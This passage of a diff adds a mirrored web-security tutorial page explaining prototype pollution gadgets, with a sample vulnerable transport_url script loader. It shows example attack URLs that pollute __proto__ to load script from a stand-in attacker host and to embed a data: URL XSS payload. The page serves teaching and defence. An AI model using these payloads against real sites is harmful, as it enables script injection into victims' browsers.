+            Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.
+        </p>
+    </li>
+</ul><p>
+    A property cannot be a gadget if it is defined directly on the object itself. In this case, the object's own version of the property takes precedence over any malicious version you're able to add to the prototype. <a href="prototype-pollution/preventing.html#preventing-an-object-from-inheriting-properties">Robust websites</a> may also explicitly set the prototype of the object to <code>null</code>, which ensures that it doesn't inherit any properties at all.
+</p><h3 id="example-of-a-prototype-pollution-gadget" chunk-id="CE2E1348977C5BDF1900384829B6F007">Example of a prototype pollution gadget</h3><p>
+    Many JavaScript libraries accept an object that developers can use to set different configuration options. The library code checks whether the developer has explicitly added certain properties to this object and, if so, adjusts the configuration accordingly. If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this:
+</p><code class="code-scrollable">let transport_url = config.transport_url || defaults.transport_url;</code><p>
+    Now imagine the library code uses this <code>transport_url</code> to add a script reference to the page:
+</p><code class="code-scrollable">let script = document.createElement('script');
+script.src = `${transport_url}/example.js`;
+document.body.appendChild(script);</code><p>
+    If the website's developers haven't set a <code>transport_url</code> property on their <code>config</code> object, this is a potential gadget. In cases where an attacker is able to pollute the global <code>Object.prototype</code> with their own <code>transport_url</code> property, this will be inherited by the <code>config</code> object and, therefore, set as the <code>src</code> for this script to a domain of the attacker's choosing.
+</p><p>
+    If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain:
+</p><code class="code-scrollable">https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net</code><p>
+    By providing a <code>data:</code> URL, an attacker could also directly embed an XSS payload within the query string as follows:
+</p><code class="code-scrollable">https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//</code><p>
+    Note that the trailing <code>//</code> in this example is simply to comment out the hardcoded <code>/example.js</code> suffix.
+</p><h3 id="what-next" cms-ignore-validation="DUPLICATE_HEADINGS">What next?</h3><p>
+    Now that you're familiar with the concepts behind prototype pollution, let's take a look at how you can find these vulnerabilities in real-world applications:
+</p><ul>
+    <li>
+        <a href="prototype-pollution/client-side.html"><span class="label-light-green-small">LABS</span> Client-side prototype pollution vulnerabilities</a></li><li><a href="prototype-pollution/server-side.html"><span class="label-light-green-small">LABS</span> Server-side prototype pollution vulnerabilities</a></li><li><a href="prototype-pollution/preventing.html">Preventing prototype pollution vulnerabilities</a>
+    </li>
+</ul>
+        
+        <div widget-id="academy-registration-footer"></div>
+    
+    </div>
+
+
+    <script src="../bundles/static-content/public/scripts/main18c2.js?v=NgmUiCsYwhVhi9Bra0okrfjnxkY" nonce="Ld5MR72mOycZkyNawHkNrEhDADpcr7ON"></script>
+    <script src="../bundles/static-content/public/scripts/web-security5605.js?v=aLTI8D4Ps-_XoohiDNpR1LAARC0" nonce="Ld5MR72mOycZkyNawHkNrEhDADpcr7ON"></script>
+
+            
+        <div class="sidebar-content">
+            <div widget-id="academy-accountstatus"></div>
+            <div class="sidebar-trial-advert">
+                <img alt="Try Burp Suite for Free" src="../content/images/logos/burp-suite-icon.svg">
+                <h4>Find prototype pollution vulnerabilities using Burp Suite</h4>
+                <a class="button-white" href="https://portswigger.net/burp">Try for free</a>
+            </div>
+        </div>
+    
+        </main>
+    </div>
+</div>
+<footer class="wrapper">
+    <div class="container">
+        <div>
+            <p>Burp Suite</p>
+            <a href="https://portswigger.net/burp/vulnerability-scanner">Web vulnerability scanner</a>
+            <a href="https://portswigger.net/burp">Burp Suite Editions</a>
+            <a href="https://portswigger.net/burp/releases">Release Notes</a>
+        </div>
+        <div>
+            <p>Vulnerabilities</p>
+            <a href="cross-site-scripting.html">Cross-site scripting (XSS)</a>
+            <a href="sql-injection.html">SQL injection</a>
+            <a href="csrf.html">Cross-site request forgery</a>
+            <a href="xxe.html">XML external entity injection</a>
+            <a href="file-path-traversal.html">Directory traversal</a>
+            <a href="ssrf.html">Server-side request forgery</a>
+        </div>
+        <div>
+            <p>Customers</p>
+            <a href="https://portswigger.net/organizations">Organizations</a>
+            <a href="https://portswigger.net/testers">Testers</a>
+            <a href="https://portswigger.net/developers">Developers</a>
+        </div>
+        <div>
+            <p>Company</p>
+            <a href="https://portswigger.net/about">About</a>
+            <a href="https://portswigger.net/careers">Careers</a>
+            <a href="https://portswigger.net/about/contact">Contact</a>
+            <a href="https://portswigger.net/legal">Legal</a>
+            <a href="https://portswigger.net/privacy">Privacy Notice</a>
+        </div>
+        <div>
+            <p>Insights</p>
+            <a href="https://portswigger.net/web-security">Web Security Academy</a>
+            <a href="https://portswigger.net/blog">Blog</a>
+            <a href="https://portswigger.net/research">Research</a>
+        </div>
+        <div>
+            <a href="https://portswigger.net/"><img src="../content/images/logos/portswigger-logo.svg" alt="PortSwigger Logo"
+                             class="footer-logo"></a>
+            <a class="button-outline-blue-small camelcase" href="https://twitter.com/Burp_Suite" rel="noreferrer"><span
+                    class="icon-twitter"></span> Follow us</a>
+            <p class="grey">&copy; 2026 PortSwigger Ltd.</p>
+        </div>
+    </div>
+</footer>
+<a href="#top" class="back-to-top"><svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 26 26">
+    <polygon points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7" fill="#f63"/>
+    <path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z"
+          fill="#f63"/>
+</svg></a>
+
+
+<script nonce="Ld5MR72mOycZkyNawHkNrEhDADpcr7ON" type="text/javascript">
+    piAId = '1067743';
+    piCId = '';
+    piHostname = 'go.portswigger.net';
+
+    (function () {
+        function async_load() {
+            var s = document.createElement('script');
+            s.type = 'text/javascript';
+            s.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + piHostname + '/pd.js';
+            var c = document.getElementsByTagName('script')[0];
+            c.parentNode.insertBefore(s, c);
+        }
+
+        if (window.attachEvent) {
+            window.attachEvent('onload', async_load);
+        } else {
+            window.addEventListener('load', async_load, false);
+        }
+    })();
+</script>
+</body>
+
+<!-- Mirrored from portswigger.net/web-security/prototype-pollution by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 17 Apr 2026 22:05:37 GMT -->
+</html>
